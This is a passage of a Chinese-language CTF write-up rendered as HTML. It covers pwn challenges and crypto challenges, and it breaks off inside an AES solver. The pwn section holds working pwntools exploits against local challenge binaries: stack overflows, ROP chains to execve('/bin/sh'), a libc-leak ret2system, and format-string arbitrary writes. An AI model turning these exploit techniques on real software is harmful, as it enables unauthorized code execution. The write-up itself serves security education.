<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
    main()</code></pre></div>
<h3 class="md-h md-h3" id="str_check"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">str_check</span></h3>
<p>栈溢出覆盖返回地址</p>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">python</span><span class="md-code-meta">17 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">57640</span>)

backdoor_addr = <span class="hljs-number">0x401236</span>
ret_gadget=<span class="hljs-number">0x40124F</span>

padding = <span class="hljs-string">b&#x27;meow\\x00&#x27;</span> + <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">35</span>
payload = padding + p64(ret_gadget) + p64(backdoor_addr)
n_copy = <span class="hljs-built_in">len</span>(payload)
p.recvuntil(<span class="hljs-string">b&quot;What can u say?\\n&quot;</span>)
p.sendline(payload)
p.recvuntil(<span class="hljs-string">b&quot;So,what size is it?\\n&quot;</span>)
p.sendline(<span class="hljs-built_in">str</span>(n_copy).encode())

p.interactive()
</code></pre></div>
<h3 class="md-h md-h3" id="syslock"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">syslock</span></h3>
<p>lose函数中存在syscall，构造rop调用该syscall即可</p>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">python</span><span class="md-code-meta">58 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

HOST = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>
PORT = <span class="hljs-number">58708</span>
exe = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)
context.binary = exe
rop = ROP(exe)
<span class="hljs-keyword">try</span>:
    pop_rdi_rsi_rdx_ret = rop.find_gadget([<span class="hljs-string">&#x27;pop rdi&#x27;</span>, <span class="hljs-string">&#x27;pop rsi&#x27;</span>, <span class="hljs-string">&#x27;pop rdx&#x27;</span>, <span class="hljs-string">&#x27;ret&#x27;</span>])[<span class="hljs-number">0</span>]
    pop_rax_ret = rop.find_gadget([<span class="hljs-string">&#x27;pop rax&#x27;</span>, <span class="hljs-string">&#x27;ret&#x27;</span>])[<span class="hljs-number">0</span>]
    syscall_addr = rop.find_gadget([<span class="hljs-string">&#x27;syscall&#x27;</span>])[<span class="hljs-number">0</span>]
<span class="hljs-keyword">except</span> IndexError <span class="hljs-keyword">as</span> e:
    exit(<span class="hljs-number">1</span>)

bss_addr = exe.bss() + <span class="hljs-number">0x200</span> <span class="hljs-comment"># 在.bss段找一块可写的空地</span>
read_plt = exe.plt[<span class="hljs-string">&#x27;read&#x27;</span>]

<span class="hljs-comment"># 构建ROP链</span>
chain = <span class="hljs-string">b&#x27;&#x27;</span>
<span class="hljs-comment"># --- 调用 read(0, bss_addr, 8) ---</span>
chain += p64(pop_rdi_rsi_rdx_ret)
chain += p64(<span class="hljs-number">0</span>)          <span class="hljs-comment"># rdi = 0 (stdin)</span>
chain += p64(bss_addr)   <span class="hljs-comment"># rsi = bss_addr</span>
chain += p64(<span class="hljs-number">8</span>)          <span class="hljs-comment"># rdx = 8 (bytes to read)</span>
chain += p64(read_plt)   <span class="hljs-comment"># 调用 read 函数</span>

<span class="hljs-comment"># --- 调用 execve(bss_addr, 0, 0) ---</span>
chain += p64(pop_rdi_rsi_rdx_ret)
chain += p64(bss_addr)   <span class="hljs-comment"># rdi = pointer to &quot;/bin/sh&quot;</span>
chain += p64(<span class="hljs-number">0</span>)          <span class="hljs-comment"># rsi = 0</span>
chain += p64(<span class="hljs-number">0</span>)          <span class="hljs-comment"># rdx = 0</span>
chain += p64(pop_rax_ret)
chain += p64(<span class="hljs-number">59</span>)         <span class="hljs-comment"># rax = 0x3b (SYS_execve)</span>
chain += p64(syscall_addr) <span class="hljs-comment"># 触发系统调用</span>


<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    p = remote(HOST, PORT)
    p.recvuntil(<span class="hljs-string">b&quot;choose mode\\n&quot;</span>)
    p.sendline(<span class="hljs-string">b&#x27;-32&#x27;</span>)
    p.recvuntil(<span class="hljs-string">b&quot;Input your password\\n&quot;</span>)
    p.send(p32(<span class="hljs-number">59</span>)) <span class="hljs-comment"># &#x27;59&#x27; 覆盖 i</span>
    p.recvuntil(<span class="hljs-string">b&quot;Developer Mode.\\n&quot;</span>)


    <span class="hljs-comment"># 72: 64(buf) + 8(saved rbp)</span>
    offset_to_ret = <span class="hljs-number">72</span>
    payload = <span class="hljs-string">b&#x27;A&#x27;</span> * offset_to_ret
    payload += chain
    p.send(payload)
    sleep(<span class="hljs-number">0.1</span>)
    p.send(<span class="hljs-string">b&#x27;/bin/sh\\x00&#x27;</span>)
    p.interactive()


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
    main()
</code></pre></div>
<h3 class="md-h md-h3" id="xdulaker"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">xdulaker</span></h3>
<p>调用photo时溢出覆盖栈上内容使得laker函数校验通过，构造ROP进入backdoor即可</p>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">python</span><span class="md-code-meta">39 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)
<span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span>
p = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">1234</span>)
elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)


p.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>)
p.recvuntil(<span class="hljs-string">b&quot;Thanks,I&#x27;ll give you a gift:&quot;</span>)
opt_addr = <span class="hljs-built_in">int</span>(p.recvline().strip(), <span class="hljs-number">16</span>)
pie_base = opt_addr - elf.symbols[<span class="hljs-string">&#x27;opt&#x27;</span>]
log.success(<span class="hljs-string">f&quot;PIE Base: <span class="hljs-subst">{<span class="hljs-built_in">hex</span>(pie_base)}</span>&quot;</span>)

payload_for_photo = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">32</span> + <span class="hljs-string">b&#x27;xdulaker&#x27;</span>
p.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;2&quot;</span>)
p.sendlineafter(<span class="hljs-string">b&quot;Hey,what&#x27;s your name?!\\n&quot;</span>, payload_for_photo)

p.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;3&quot;</span>)

p.recvuntil(<span class="hljs-string">b&quot;welcome,xdulaker\\n&quot;</span>)
rop = ROP(elf)

backdoor_addr = pie_base + elf.symbols[<span class="hljs-string">&#x27;backdoor&#x27;</span>]
ret_gadget_addr = rop.find_gadget([<span class="hljs-string">&#x27;ret&#x27;</span>])[<span class="hljs-number">0</span>]
writable_bss_addr = elf.bss()+<span class="hljs-number">0x800</span>
log.success(<span class="hljs-string">f&quot;backdoor address: <span class="hljs-subst">{<span class="hljs-built_in">hex</span>(backdoor_addr)}</span>&quot;</span>)

payload_for_laker = flat(
    <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">48</span>-<span class="hljs-number">8</span>),              <span class="hljs-comment"># 填充 s1 缓冲区</span>
    writable_bss_addr,      <span class="hljs-comment"># [rbp] 覆盖旧 rbp 为一个可写地址，以满足 leave 指令</span>
    ret_gadget_addr,        <span class="hljs-comment"># [rip] 首先跳转到 ret gadget 来对齐栈</span>
    backdoor_addr + <span class="hljs-number">8</span>           <span class="hljs-comment"># [new_stack] 然后再跳转到 backdoor 函数</span>
)

p.sendline(payload_for_laker)


p.interactive()</code></pre></div>
<h3 class="md-h md-h3" id="eazylibc"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">eazylibc</span></h3>
<p>先patchelf使本地二进制使用题目给的libc</p>
<p>关键在于获取libc基址</p>
<p>然而有延迟绑定机制的存在，第一次打印的时候read还没有被调用，打印出来的并不是libc中的read，而是plt表中的read</p>
<p>但借此我们可以获取PIE基址</p>
<p>通过PIE基址+偏移我们可以返回到main函数运行第二次</p>
<p>此时由于read已经被调用过所以打印出的是真实地址</p>
<p>减去偏移即可得到libc基址</p>
<p>然后在libc中可以搜索gadget，构造system调用即可</p>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">python</span><span class="md-code-meta">45 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
context(os=<span class="hljs-string">&quot;linux&quot;</span>, arch=<span class="hljs-string">&quot;amd64&quot;</span>, log_level=<span class="hljs-string">&quot;debug&quot;</span>)
io = process(<span class="hljs-string">&quot;./pwn&quot;</span>)
io = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">1234</span>)
elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)
libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)

io.recvuntil(<span class="hljs-string">b&quot;What is this?\\nHow can I use &quot;</span>)
leaked_read_str1 = io.recvuntil(<span class="hljs-string">b&quot; without a backdoor? Damn!\\n&quot;</span>, drop=<span class="hljs-literal">True</span>)
leaked_read_plt = <span class="hljs-built_in">int</span>(leaked_read_str1, <span class="hljs-number">16</span>)
log.success(<span class="hljs-string">f&quot;Address: <span class="hljs-subst">{<span class="hljs-built_in">hex</span>(leaked_read_plt)}</span>&quot;</span>)
pie_base = leaked_read_plt - <span class="hljs-number">0x1060</span>
log.success(<span class="hljs-string">f&quot;PIE Base Address: <span class="hljs-subst">{<span class="hljs-built_in">hex</span>(pie_base)}</span>&quot;</span>)

elf.address = pie_base
new_stack_rbp = elf.bss() + <span class="hljs-number">0x200</span>
payload1 = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">32</span>
payload1 += p64(new_stack_rbp) <span class="hljs-comment"># leave; ret会进行栈迁移</span>
payload1 += p64(pie_base + <span class="hljs-number">0x11ee</span>) 
io.send(payload1)


io.recvuntil(<span class="hljs-string">b&quot;What is this?\\nHow can I use &quot;</span>)
leaked_read_str2 = io.recvuntil(<span class="hljs-string">b&quot; without a backdoor? Damn!\\n&quot;</span>, drop=<span class="hljs-literal">True</span>)
leaked_read = <span class="hljs-built_in">int</span>(leaked_read_str2, <span class="hljs-number">16</span>)
log.success(<span class="hljs-string">f&quot;Address: <span class="hljs-subst">{<span class="hljs-built_in">hex</span>(leaked_read)}</span>&quot;</span>)
libc_base = leaked_read - libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]
log.success(<span class="hljs-string">f&quot;libc Base Address: <span class="hljs-subst">{<span class="hljs-built_in">hex</span>(libc_base)}</span>&quot;</span>)
libc.address = libc_base


pop_rdi_ret = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdi; ret&#x27;</span>)))
bin_sh_addr = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\\x00&#x27;</span>))
system_addr = libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]


payload3 = <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">32</span>
payload3 += p64(new_stack_rbp) 
payload3 += p64(pop_rdi_ret + <span class="hljs-number">1</span>)       <span class="hljs-comment"># ret</span>
payload3 += p64(pop_rdi_ret)       <span class="hljs-comment"># pop rdi; ret</span>
payload3 += p64(bin_sh_addr)       <span class="hljs-comment"># -&gt; rdi = address of &quot;/bin/sh&quot;</span>
payload3 += p64(system_addr)       <span class="hljs-comment"># ret to system()</span>
io.send(payload3)

io.interactive()</code></pre></div>
<h3 class="md-h md-h3" id="fmt_s"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">fmt_S</span></h3>
<p>每次talk会将flag^1，在bss上查看flag紧邻atk，只要在读取atk时输入长度为8，my_read就可以覆盖flag为0，这样保证我们有3次输入机会</p>
<p>在talk的printf函数调用处下断点发现栈上有链（链上地址都在栈中，这样就可以只修改低位字节），那么可以利用链实行任意地址写</p>
<p>在talk函数的retn处下断点发现rdi为atk，那么可以将atk设置为<code class="md-code-inline">/bin/sh</code>（加上\\x00正好8个字节），然后将栈上talk函数的返回地址利用链写成he函数中system的地方即可</p>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">python</span><span class="md-code-meta">35 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

context(os=<span class="hljs-string">&quot;linux&quot;</span>, arch=<span class="hljs-string">&quot;amd64&quot;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)
elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)
libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)
<span class="hljs-comment">#io = process(&quot;./pwn&quot;)</span>
io = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">1234</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">interact</span>(<span class="hljs-params">payload_str</span>):
    fmt = payload_str.ljust(<span class="hljs-number">32</span>, <span class="hljs-string">b&#x27;\\x00&#x27;</span>)
    payload = fmt 
    io.sendafter(<span class="hljs-string">b&quot;him...\\n&quot;</span>, payload)

SYSTEM_CALL_ADDR = <span class="hljs-number">0x40127B</span>
LEAK_RBP_PARAM = <span class="hljs-number">8</span>

interact(<span class="hljs-string">f&quot;%<span class="hljs-subst">{LEAK_RBP_PARAM}</span>$p&quot;</span>.encode())
io.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)
leaked_talk_rbp = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&quot;?&quot;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)-<span class="hljs-number">0x20</span>
info(<span class="hljs-string">f&quot;Leaked RBP: <span class="hljs-subst">{<span class="hljs-built_in">hex</span>(leaked_talk_rbp)}</span>&quot;</span>)

return_addr_location = leaked_talk_rbp + <span class="hljs-number">0x8</span> 
io.sendafter(<span class="hljs-string">b&quot;battle!\\n&quot;</span>, <span class="hljs-string">b&#x27;/bin/sh\\x00&#x27;</span>)


fmt2_str = <span class="hljs-string">&quot;%{}c%{}$hn&quot;</span>.<span class="hljs-built_in">format</span>(return_addr_location % <span class="hljs-number">0x10000</span>, <span class="hljs-number">8</span>+<span class="hljs-number">0x48</span>//<span class="hljs-number">8</span>).encode()
interact(fmt2_str)
io.sendafter(<span class="hljs-string">b&quot;battle!\\n&quot;</span>, <span class="hljs-string">b&#x27;/bin/sh\\x00&#x27;</span>)


fmt3_str = <span class="hljs-string">&quot;%{}c%{}$hn&quot;</span>.<span class="hljs-built_in">format</span>(SYSTEM_CALL_ADDR % <span class="hljs-number">0x10000</span>, <span class="hljs-number">47</span>).encode()
interact(fmt3_str)
io.sendafter(<span class="hljs-string">b&quot;battle!\\n&quot;</span>, <span class="hljs-string">b&#x27;/bin/sh\\x00&#x27;</span>)

io.interactive()</code></pre></div>
<h2 class="md-h md-h2" id="crypto"><span class="md-hash" aria-hidden="true">## </span><span class="md-h-text">crypto</span></h2>
<h3 class="md-h md-h3" id="ez_des"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">ez_DES</span></h3>
<p>key有三字节未知，爆破即可</p>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">python</span><span class="md-code-meta">21 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> DES
<span class="hljs-keyword">import</span> string
<span class="hljs-keyword">import</span> itertools

c = <span class="hljs-string">b&#x27;\\xe6\\x8b0\\xc8m\\t?\\x1d\\xf6\\x99sA&gt;\\xce \\rN\\x83z\\xa0\\xdc{\\xbc\\xb8X\\xb2\\xe2q\\xa4&quot;\\xfc\\x07&#x27;</span>

key_prefix = <span class="hljs-string">&#x27;ezdes&#x27;</span>
characters = string.ascii_letters + string.digits + string.punctuation

<span class="hljs-keyword">for</span> suffix_chars <span class="hljs-keyword">in</span> itertools.product(characters, repeat=<span class="hljs-number">3</span>):
    <span class="hljs-keyword">try</span>:
        suffix = <span class="hljs-string">&#x27;&#x27;</span>.join(suffix_chars)
        potential_key = (key_prefix + suffix).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)
        cipher = DES.new(potential_key, DES.MODE_ECB)
        decrypted_text = cipher.decrypt(c)
        <span class="hljs-keyword">if</span> decrypted_text.startswith(<span class="hljs-string">b&#x27;moectf{&#x27;</span>):
            flag = decrypted_text.split(<span class="hljs-string">b&#x27;}&#x27;</span>)[<span class="hljs-number">0</span>].decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>) + <span class="hljs-string">&#x27;}&#x27;</span>
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Flag: <span class="hljs-subst">{flag}</span>&quot;</span>)
            <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">continue</span></code></pre></div>
<h3 class="md-h md-h3" id="baby_next"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">baby_next</span></h3>
<p>由于q是p的后114514个素数，因此p，q应该都很接近平方根，尝试平方根附近的素数即可</p>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">python</span><span class="md-code-meta">34 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes
<span class="hljs-keyword">import</span> gmpy2
<span class="hljs-keyword">import</span> math

n = <span class="hljs-number">96742777571959902478849172116992100058097986518388851527052638944778038830381328778848540098201307724752598903628039482354215330671373992156290837979842156381411957754907190292238010742130674404082688791216045656050228686469536688900043735264177699512562466087275808541376525564145453954694429605944189276397</span>
c = <span class="hljs-number">17445962474813629559693587749061112782648120738023354591681532173123918523200368390246892643206880043853188835375836941118739796280111891950421612990713883817902247767311707918305107969264361136058458670735307702064189010952773013588328843994478490621886896074511809007736368751211179727573924125553940385967</span>
e = <span class="hljs-number">65537</span>
ITERATIONS = <span class="hljs-number">114514</span>


s = gmpy2.isqrt(n)
avg_gap = math.log(s)
delta_approx = ITERATIONS * avg_gap
<span class="hljs-comment"># p ≈ sqrt(n) - delta / 2</span>
p_approx = s - <span class="hljs-built_in">int</span>(delta_approx / <span class="hljs-number">2</span>)
p_candidate = gmpy2.prev_prime(p_approx)
<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
    <span class="hljs-keyword">if</span> n % p_candidate == <span class="hljs-number">0</span>:
        p = p_candidate
        q = n // p
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;p = <span class="hljs-subst">{p}</span>&quot;</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;q = <span class="hljs-subst">{q}</span>&quot;</span>)
        <span class="hljs-keyword">break</span>
    p_candidate = gmpy2.prev_prime(p_candidate)


phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)
d = <span class="hljs-built_in">pow</span>(e, -<span class="hljs-number">1</span>, phi)
m = <span class="hljs-built_in">pow</span>(c, d, n)

flag = long_to_bytes(m)

<span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Flag: <span class="hljs-subst">{flag.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)}</span>&quot;</span>)
</code></pre></div>
<h3 class="md-h md-h3" id="ezbsgs"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">ezBSGS</span></h3>
<p>Baby-Step Giant-Step</p>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">python</span><span class="md-code-meta">34 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-python"><span class="hljs-keyword">import</span> math

<span class="hljs-keyword">def</span> <span class="hljs-title function_">solve_bsgs</span>(<span class="hljs-params">base, result, modulus</span>):
    m = math.isqrt(modulus) + <span class="hljs-number">1</span>
    baby_steps = {}
    baby_val = <span class="hljs-number">1</span>
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m):
        <span class="hljs-keyword">if</span> baby_val <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> baby_steps:
            baby_steps[baby_val] = j
        baby_val = (baby_val * base) % modulus
    a_m = <span class="hljs-built_in">pow</span>(base, m, modulus)
    inv_a_m = <span class="hljs-built_in">pow</span>(a_m, modulus - <span class="hljs-number">2</span>, modulus)
    giant_val = result
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m):
        <span class="hljs-keyword">if</span> giant_val <span class="hljs-keyword">in</span> baby_steps:
            j = baby_steps[giant_val]
            <span class="hljs-keyword">return</span> i * m + j
        giant_val = (giant_val * inv_a_m) % modulus
    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
    a = <span class="hljs-number">13</span>
    b = <span class="hljs-number">114514</span>
    p = <span class="hljs-number">100000000000099</span>

    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">{a}</span>^x = <span class="hljs-subst">{b}</span> mod <span class="hljs-subst">{p}</span>&quot;</span>)
    x = solve_bsgs(a, b, p)

    <span class="hljs-keyword">if</span> x <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;x : <span class="hljs-subst">{x}</span>&quot;</span>)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;none&quot;</span>)
</code></pre></div>
<h3 class="md-h md-h3" id="ez_square"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">ez_square</span></h3>
<p>完全平方公式，然后得到p-q，p+q，然后解出p，q</p>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">python</span><span class="md-code-meta">27 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes
<span class="hljs-keyword">import</span> gmpy2

n = <span class="hljs-number">83917281059209836833837824007690691544699901753577294450739161840987816051781770716778159151802639720854808886223999296102766845876403271538287419091422744267873129896312388567406645946985868002735024896571899580581985438021613509956651683237014111116217116870686535030557076307205101926450610365611263289149</span>
c = <span class="hljs-number">69694813399964784535448926320621517155870332267827466101049186858004350675634768405333171732816667487889978017750378262941788713673371418944090831542155613846263236805141090585331932145339718055875857157018510852176248031272419248573911998354239587587157830782446559008393076144761176799690034691298870022190</span>
hint = <span class="hljs-number">5491796378615699391870545352353909903258578093592392113819670099563278086635523482350754035015775218028095468852040957207028066409846581454987397954900268152836625448524886929236711403732984563866312512753483333102094024510204387673875968726154625598491190530093961973354413317757182213887911644502704780304</span>
e = <span class="hljs-number">65537</span>


D = gmpy2.isqrt(hint) <span class="hljs-comment"># D = p - q</span>
S_squared = <span class="hljs-number">4</span> * n + D * D
S = gmpy2.isqrt(S_squared) <span class="hljs-comment"># S = p + q</span>

p = (S + D) // <span class="hljs-number">2</span>
q = (S - D) // <span class="hljs-number">2</span>

<span class="hljs-keyword">assert</span> p * q == n
<span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;p = <span class="hljs-subst">{p}</span>&quot;</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;q = <span class="hljs-subst">{q}</span>&quot;</span>)


phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)
d = <span class="hljs-built_in">pow</span>(e, -<span class="hljs-number">1</span>, phi)
m = <span class="hljs-built_in">pow</span>(c, d, n)
flag = long_to_bytes(m)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Flag: <span class="hljs-subst">{flag.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)}</span>&quot;</span>)
</code></pre></div>
<h3 class="md-h md-h3" id="ezaes"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">ezAES</span></h3>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">python</span><span class="md-code-meta">104 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-python">rc = [<span class="hljs-number">0x12</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x9a</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0xbc</span>, <span class="hljs-number">0xcd</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0xef</span>,<span class="hljs-number">0xf1</span>]

s_box = [
	[<span class="hljs-number">0x63</span>, <span class="hljs-number">0x7c</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0xf2</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0x76</span>],
	[<span class="hljs-number">0xca</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0xfa</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0xd4</span>, <span class="hljs-number">0xa2</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xc0</span>],
	[<span class="hljs-number">0xb7</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x15</span>],
	[<span class="hljs-number">0x04</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xc3</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x9a</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x75</span>],
	[<span class="hljs-number">0x09</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x84</span>],
	[<span class="hljs-number">0x53</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xfc</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0xcb</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xcf</span>],
	[<span class="hljs-number">0xd0</span>, <span class="hljs-number">0xef</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0xa8</span>],
